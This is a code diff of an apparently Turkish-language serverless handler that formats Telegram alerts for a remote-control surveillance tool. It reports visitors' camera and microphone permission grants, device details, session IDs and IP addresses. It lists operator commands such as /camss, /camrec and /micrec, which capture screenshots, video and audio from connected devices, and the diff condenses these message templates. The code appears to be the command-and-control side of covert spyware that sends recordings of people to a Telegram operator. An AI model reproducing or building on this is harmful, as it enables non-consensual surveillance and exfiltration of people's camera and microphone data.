@@ -85,11 +85,7 @@ function formatTelegramMessage(logData, ip) {
         'camera_permission_denied': '🚫 KAMERA İZNİ REDDEDİLDİ',
         'microphone_permission_granted': '🎤 MİKROFON İZNİ VERİLDİ',
         'microphone_permission_denied': '🚫 MİKROFON İZNİ REDDEDİLDİ',
-        'remote_control_started': '🎮 CİHAZ BAĞLANDI - UZAKTAN KONTROL AKTİF',
-        'command_received': '📡 KOMUT ALINDI',
-        'command_error': '⚠️ KOMUT HATASI',
-        'device_info': '📱 AKTİF CİHAZ BİLGİSİ',
-        'help_guide': '📖 KULLANIM KILAVUZU',
+        'help_guide': '📖 KOMUTLAR',
         'active_device_card': '📱 AKTİF CİHAZ'
     };
 
@@ -98,80 +94,26 @@ function formatTelegramMessage(logData, ip) {
     let message = `${title}\n`;
     message += `━━━━━━━━━━━━━━━━\n`;
 
-    // Active device card için özel format
+    // Active device card için özel format - BASITLEŞTIRILMIŞ
     if (event_type === 'active_device_card' && additional_data) {
         const emoji = additional_data.emoji || '📱';
         message = `${emoji} <b>AKTİF CİHAZ</b>\n`;
         message += `━━━━━━━━━━━━━━━━\n\n`;
-        
         message += `<b>🖥️ Platform:</b> ${additional_data.platform || 'Unknown'}\n`;
         message += `<b>🌐 Tarayıcı:</b> ${additional_data.browser || 'Unknown'}\n`;
         message += `<b>📺 Ekran:</b> ${additional_data.screen || 'Unknown'}\n`;
-        message += `<b>🌍 Dil:</b> ${additional_data.language || 'Unknown'}\n`;
-        message += `<b>🕐 Zaman Dilimi:</b> ${additional_data.timezone || 'Unknown'}\n`;
-        
-        if (additional_data.memory && additional_data.memory !== 'Unknown') {
-            message += `<b>💾 Bellek:</b> ${additional_data.memory}GB\n`;
-        }
-        
-        if (additional_data.connection && additional_data.connection !== 'Unknown') {
-            message += `<b>📡 Bağlantı:</b> ${additional_data.connection}\n`;
-        }
-        
-        message += `<b>${additional_data.online === 'Online' ? '🟢' : '🔴'} Durum:</b> ${additional_data.online || 'Unknown'}\n\n`;
-        
-        message += `<code>Session: ${additional_data.session_id || 'unknown'}</code>\n\n`;
-        
-        message += `━━━━━━━━━━━━━━━━\n`;
-        message += `💡 <b>Komutlar:</b>\n`;
-        message += `• <code>/camss</code> - Screenshot al\n`;
-        message += `• <code>/camrec10</code> - 10s video\n`;
-        message += `• <code>/micrec5</code> - 5s ses\n`;
-        message += `• <code>/help</code> - Tüm komutlar`;
-        
+        message += `<code>Session: ${additional_data.session_id || 'unknown'}</code>`;
         return message;
     }
 
-    // Help guide için özel format
+    // Help guide için özel format - KISALTILMIŞ
     if (event_type === 'help_guide') {
-        message = `📖 <b>UZAKTAN KONTROL KILAVUZU</b>\n`;
-        message += `━━━━━━━━━━━━━━━━\n\n`;
-        
-        message += `<b>📱 CİHAZ BİLGİSİ:</b>\n`;
-        message += `<code>/devices</code> - Aktif cihazları göster\n`;
-        message += `<code>/help</code> - Bu kılavuzu göster\n\n`;
-        
-        message += `<b>📷 KAMERA SCREENSHOT:</b>\n`;
-        message += `<code>/camss</code> - Tüm cihazlardan\n`;
-        message += `<code>/camss 2</code> - Sadece 2. cihazdan\n\n`;
-        
-        message += `<b>🎥 VİDEO KAYIT:</b>\n`;
-        message += `<code>/camrec</code> - 5 saniye (default)\n`;
-        message += `<code>/camrec10</code> - 10 saniye (tüm cihazlar)\n`;
-        message += `<code>/camrec10 2</code> - 10 saniye (2. cihaz)\n`;
-        message += `<code>/camrec30</code> - 30 saniye (maksimum)\n\n`;
-        
-        message += `<b>🎤 SES KAYIT:</b>\n`;
-        message += `<code>/micrec</code> - 5 saniye (default)\n`;
-        message += `<code>/micrec10</code> - 10 saniye (tüm cihazlar)\n`;
-        message += `<code>/micrec10 2</code> - 10 saniye (2. cihaz)\n`;
-        message += `<code>/micrec30</code> - 30 saniye (maksimum)\n\n`;
-        
-        message += `<b>💡 İPUÇLARI:</b>\n`;
-        message += `• Cihaz numarası belirtmezsen tüm cihazlar çalışır\n`;
-        message += `• Süre: Min 1s, Max 30s\n`;
-        message += `• Komutlar tek seferlik çalışır\n`;
-        message += `• Video kalitesi: 640x480 (küçük dosya)\n\n`;
-        
-        message += `<b>📊 ÖRNEK KULLANIM:</b>\n`;
-        message += `1️⃣ <code>/devices</code> → Cihazları listele\n`;
-        message += `2️⃣ <code>/camss 1</code> → 1. cihazdan screenshot\n`;
-        message += `3️⃣ <code>/camrec15 2</code> → 2. cihazdan 15s video\n`;
-        message += `4️⃣ <code>/micrec10</code> → Tüm cihazlardan 10s ses\n\n`;
-        
-        message += `━━━━━━━━━━━━━━━━\n`;
-        message += `🎮 Sistem Aktif - Komutlar Hazır!\n`;
-        
+        message = `📖 <b>KOMUT KILAVUZU</b>\n━━━━━━━━━━━━━━━━\n`;
+        message += `<code>/devices</code> - Cihazları listele\n`;
+        message += `<code>/camss</code> - Screenshot\n`;
+        message += `<code>/camrec[süre]</code> - Video (max 30s)\n`;
+        message += `<code>/micrec[süre]</code> - Ses (max 30s)\n`;
+        message += `━━━━━━━━━━━━━━━━`;
         return message;
     }
 
@@ -272,10 +214,10 @@ export default async function handler(req, res) {
 
     try {
         // IP adresini al (Vercel headers)
-        const ip = req.headers['x-forwarded-for'] || 
-                   req.headers['x-real-ip'] || 
-                   req.connection?.remoteAddress || 
-                   'Unknown';
+        const ip = req.headers['x-forwarded-for'] ||
+            req.headers['x-real-ip'] ||
+            req.connection?.remoteAddress ||
+            'Unknown';
 
         // Rate limiting kontrolü (sadece page_view için)
         const logData = req.body;
